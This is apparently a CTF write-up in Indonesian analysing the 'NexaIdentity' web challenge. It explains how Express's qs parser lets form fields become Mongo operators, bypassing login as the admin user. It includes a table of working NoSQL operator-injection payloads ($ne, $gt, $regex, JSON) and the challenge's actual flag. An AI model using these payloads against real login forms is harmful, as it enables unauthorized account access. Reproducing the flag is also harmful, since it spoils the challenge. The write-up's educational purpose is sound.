# NexaIdentity — Analisis

[← Overview](11-nexaidentity.md) · [Index](index.md)

### 2.1 Express + qs: bracket notation menjadi objek

Form login menggunakan `application/x-www-form-urlencoded`. Express dengan `extended: true` memakai `qs`, yang mengubah:

```text
email[$ne]=x&password[$ne]=x
```

menjadi:

```js
{
  email: { $ne: "x" },
  password: { $ne: "x" }
}
```

Jika backend melakukan query mirip Mongo:

```js
const user = await users.findOne({ email: req.body.email, password: req.body.password });
```

maka objek operator `$ne` diteruskan apa adanya. Query `{ email: { $ne: "x" }, password: { $ne: "x" } }` cocok dengan **dokumen pertama** yang email dan password-nya bukan `"x"`. Dokumen pertama pada seed adalah admin (Nadia Kusuma), sehingga session menjadi admin.

Ini adalah **NoSQL operator injection / authentication bypass**, bukan SQL injection biasa. Nama flag (`n0sql_0p3r4t0r_4uth_byp4ss`) mengonfirmasi.

### 2.2 Mengapa admin?

`/directory` menampilkan 12 karyawan; kartu pertama adalah:

```text
Nadia Kusuma
Head of People Operations
People Operations · Jakarta
admin@nexaidentity.test
```

Backend tampaknya menyimpan admin sebagai user pertama. `$ne` tanpa kriteria field lain cocok dengan user pertama, yaitu Nadia. Session kemudian memiliki role admin, sehingga `/admin` tidak lagi 403.

### 2.3 Variasi payload

Kami menguji beberapa bentuk pada instance live:

| Payload | Hasil |
|---|---|
| `email=employee@nexaidentity.test&password=wrong` | `401`, tetap di login |
| `email=&password=` | `401` |
| `email[$ne]=x&password[$ne]=x` | `302 /dashboard`, login sebagai **Nadia Kusuma** |
| `email=admin@nexaidentity.test&password[$ne]=x` | `302`, login sebagai Nadia |
| `email[$ne]=&password[$ne]=` | `302`, login sebagai Nadia |
| `email[$gt]=&password[$gt]=` | `302`, login sebagai Nadia |
| `email=admin@nexaidentity.test&password[$regex]=.*` | `302`, login sebagai Nadia |
| JSON `{"email":{"$ne":null},"password":{"$ne":null}}` | `302`, login sebagai Nadia |

Catatan: `email=admin@nexaidentity.test&password=` (tanpa operator) tetap `401`; jadi yang penting adalah objek operator, bukan hanya email admin.

### 2.4 Perbedaan flag format

- `BRIEF.md` menulis flag format `NFCTF{...}`.
- `challenge.json`/manifest dan flag aktual memakai `NFX{...}`.
- Flag yang benar adalah `NFX{n0sql_0p3r4t0r_4uth_byp4ss}` (cocok dengan `flags/web/05_nexaidentity.txt`).
